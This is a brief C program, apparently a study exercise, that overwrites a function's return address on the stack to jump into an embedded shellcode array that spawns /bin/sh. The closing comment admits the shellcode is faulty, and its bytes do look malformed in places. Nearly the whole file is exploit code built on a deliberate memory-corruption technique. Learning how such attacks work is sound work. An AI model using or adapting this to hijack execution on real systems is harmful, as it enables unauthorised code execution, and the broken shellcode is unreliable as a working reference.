#include<stdio.h>

char shellcode[] =
	"\xe9\x37\x71\xfb\xf7\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd0/bin/sh";

void func() {
   int *ret;

   ret = (int)&ret + 8;
   (*ret) = (int)shellcode;
   //(*ret) = (*ret) + 12;

}

void main(){
	func();
	printf("in main after func\n");
	printf("skipped 1 instruction\n");
}

// going to shellcode correctly, problem is in shellcode.
